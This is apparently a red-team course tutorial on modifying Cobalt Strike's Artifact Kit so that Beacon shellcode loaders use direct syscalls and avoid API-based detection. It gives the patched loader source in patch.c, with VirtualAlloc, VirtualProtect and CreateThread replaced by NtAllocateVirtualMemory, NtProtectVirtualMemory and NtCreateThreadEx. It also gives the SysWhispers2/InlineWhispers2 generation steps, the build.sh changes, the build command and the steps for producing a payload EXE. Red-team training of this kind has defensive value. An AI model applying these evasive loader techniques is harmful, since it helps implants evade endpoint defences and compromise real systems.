The use of syscalls can be integrated into Cobalt Strike's Artifact Kit, which is useful in cases where Beacon payloads are being detected through their use of APIs.  The payloads themselves act as simple shellcode loaders, which bootstrap and run a reflective package.

For instance - the default EXE payload uses VirtualAlloc, VirtualProtect and CreateThread to execute Beacon shellcode inside itself.  This is the spawn function, located in `cobaltstrike/arsenal-kit/kits/artifact/src-common/patch.c`.

```cpp
 89 #elif USE_VirtualAlloc
 90    ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

...

113 #if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
114    /* fix memory protection */
115    DWORD old;
116    VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
117 #endif
118
119    /* spawn a thread with our data */
120    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
```

The default output from SysWhispers2 doesn't play nice with Beacon artifacts or BOFs.  So we need to use another tool, [InlineWhispers2](https://github.com/Sh0ckFR/InlineWhispers2) to convert the output slightly.

```shell
ubuntu@teamserver ~/I/SysWhispers2 (main)> pwd
/home/ubuntu/InlineWhispers2/SysWhispers2

ubuntu@teamserver ~/I/SysWhispers2 (main)> python3 syswhispers.py -p all -o syscalls_all
ubuntu@teamserver ~/I/SysWhispers2 (main)> cd ..
ubuntu@teamserver ~/InlineWhispers2 (main)> python3 InlineWhispers2.py

Sh0ckFR - https://twitter.com/Sh0ckFR
Import syscalls.c syscalls.h, syscalls-asm.h in your project and include syscalls.c to start to use syscalls
```

Copy `syscalls.c`, `syscalls.h` and `syscalls-asm.h` to `src-common` inside the artifact kit directory structure.

```shell
ubuntu@teamserver ~/InlineWhispers2 (main)> ls output/
syscalls-asm.h  syscalls.c  syscalls.h

ubuntu@teamserver ~/InlineWhispers2 (main)> cp output/* ~/cobaltstrike/arsenal-kit/kits/artifact/src-common/
``` 

Open `patch.c` in an editor and add `#include "syscalls.c"` above the `spawn` function.

```cpp
 66 #include "syscalls.c"
 67 void spawn(void * buffer, int length, char * key) {
```  

Then it's just a case of replacing the Win32 API calls with their Nt equivalent.
```cpp
 90 #elif USE_VirtualAlloc
 91    HANDLE hProcess;
 92
 93    /* get handle to own process */
 94    OBJECT_ATTRIBUTES oa;
 95    InitializeObjectAttributes(&oa, 0, 0, 0, 0);
 96
 97    CLIENT_ID cid = { (HANDLE)GetCurrentProcessId(), NULL};
 98    NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
 99
100    /* allocate memory */
101    SIZE_T regionSize = (SIZE_T)length;
102    NtAllocateVirtualMemory(hProcess, &ptr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  

125 #if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
126    /* fix memory protection */
127    DWORD old;
128    NtProtectVirtualMemory(hProcess, &ptr, &regionSize, PAGE_EXECUTE_READ, &old);

  

132    /* spawn a thread with our data */
133    HANDLE hThread;
134    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, &run, ptr, FALSE, 0, 0, 0, NULL);
```

Before being able to rebuild the artifacts, we have to modify `build.sh`.

1.  Modify the two `c_options` variables in the `build_artifacts64` function to include `-masm=intel`.  At the time of writing, these are on lines 79 and 102.
2.  Since in this example, we've only generated x64 syscalls, we need to disable the x86 builds by commenting out the call to `build_artifacts` (line 282).  If you require x86 builds, you can use the `_M_X64` directive inside the artifact source code to reference different syscalls files.

  

Run the build script, ensuring to specify the VirtualAlloc allocation type.

```shell
ubuntu@teamserver ~/c/a/k/artifact> ./build.sh pipe VirtualAlloc 271360 5 true false /tmp/artifact
```  

Copy the new artifacts to the Attacker Windows VM and load the `artifact.cna`.  

```powershell
C:\Users\Administrator>pscp -r -i Desktop\ssh.ppk ubuntu@10.10.0.69:/tmp/artifact/pipe C:\Tools\cobaltstrike
artifact64svc.exe         | 21 kB |  21.0 kB/s | ETA: 00:00:00 | 100%
artifact.cna              | 11 kB |  11.4 kB/s | ETA: 00:00:00 | 100%
artifact64.x64.dll        | 53 kB |  53.5 kB/s | ETA: 00:00:00 | 100%
artifact64big.x64.dll     | 317 kB | 317.5 kB/s | ETA: 00:00:00 | 100%
artifact64.exe            | 54 kB |  54.5 kB/s | ETA: 00:00:00 | 100%
artifact64big.exe         | 318 kB | 318.5 kB/s | ETA: 00:00:00 | 100%
artifact64svcbig.exe      | 285 kB | 285.0 kB/s | ETA: 00:00:00 | 100%
```

Then go to **Attacks > Packages > Windows Executable (S)** and generate a new x64 Windows EXE.